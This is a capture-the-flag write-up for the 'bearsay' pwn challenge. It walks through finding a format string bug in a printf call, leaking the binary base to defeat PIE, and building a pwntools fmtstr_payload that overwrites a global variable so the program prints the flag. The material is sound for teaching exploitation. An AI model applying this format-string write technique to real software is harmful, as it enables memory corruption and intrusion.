### Analysis

The entire program is relatively large to reverse engineer (although not difficult at all), but the crux is here:

```c
      iVar2 = strcmp("flag",&buffer);
      if (iVar2 != 0) break;
      if (is_mother_bear != 0xbad0bad) {
        uVar1 = rand();
        printf("ANGRY BEAR %s\n",*(undefined8 *)(bears + (ulong)(uVar1 & 3) * 8));
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
      __stream = fopen("./flag.txt","r");
      fgets(flag,0x1000,__stream);
      fclose(__stream);
      box(0x7c,0x2d,2,flag);
      puts("|\n|\n|");
      uVar1 = rand();
      puts(*(char **)(bears + (ulong)(uVar1 & 3) * 8));
    }
```

if we give "flag" as the input the program will open `./flag.txt` and print it out, provided `is_mother_bear` = 0xbad0bad. The only problem is, `is_mother_bear` is explicitly defined as 0 and moreover it is never changed throughout the entire execution.

### Vulnerability

Honestly I did not reverse engineer the entire program and couldn't find the vulnerability in the first attempt and almost gave up. 

Luckily my teammate [makider](https://makider.me/) did not give up and tested the program for format string vulnerability, and it turns out, that was the intented bug. So I took the efforts and saw the `box()` function again and found that it was hiding between several `putchar()` calls:

```c
  putchar(0x20);
  printf(param_4); // <- vulnerability
  putchar(0x20);
  putchar((int)param_1);
  putchar(10);
```

Format string vulnerabilities are super helpful because they allow both arbitrary read and arbitrary write.

### Exploit

From now the plan is straightforward, use fmt vuln to write 0xbad0bad to `is_mother_bear`, but if you look at the protections:

```console
$ checksec chal
[*] '/home/vulnx/Games/CTFs/amateurs/pwn/bearsay/bearsay/chal'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./lib'
```

`PIE` is enabled, which means the memory address of `is_mother_bear` will be randomized on every execution.

This is not a problem for us since we can utilise the fmt vuln to get a binary leak and use that leak to calculate the actual address of `is_mother_bear` at runtime since the interal offsets won't be changing.

If you set a breakpoint in GDB just before the `printf(foo)` call and look at the stack, here is how it will look:

```

```

We notice 2 important things from this stack dump:

1. We have a binary address at RBP+0x8 : `0x7fffffffb9f8 â€”â–¸ 0x555555555678`

2. Our input is at RBP+0x40 : `0x7fffffffba30 â—‚â€” 'AAAABBBB'`

We can easily calculate at which indexes can we find these by:

`index = ((<stack_address> - RSP)/8)+6`

In this case:

```
pwndbg> p/d ((0x7fffffffb9f8-0x7fffffffb9b0)/8)+6
$1 = 15
pwndbg> p/d ((0x7fffffffba30-0x7fffffffb9b0)/8)+6
$2 = 22
```

- we can get binary leak via: `%15$p`

- and get the start of our input via: `%22$p`

Also by doing this:

```
pwndbg> vmmap 0x555555555678
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File

â–º   0x555555555000     0x555555556000 r-xp     1000   1000 /home/vulnx/Games/CTFs/amateurs/pwn/bearsay/bearsay/chal +0x678
    0x555555556000     0x555555557000 r--p     1000   2000 /home/vulnx/Games/CTFs/amateurs/pwn/bearsay/bearsay/chal
pwndbg> p/x 0x555555555678-0x555555554000
$3 = 0x1678
```

we can find out that the binary leak is 0x1678 bytes ahead of the actual binary base so we know what to subtract :D



Once we have the correct binary base, we have the correct address of `is_mother_bear`, now we can simply use pwntools `fmtstr_payload` function to set `is_mother_bear` to 0xbad0bad via:

```python
payload = fmtstr_payload(22, {
    is_mother_bear: 0xbad0bad
}, write_size='short')
```

we then send this payload and get the flag.
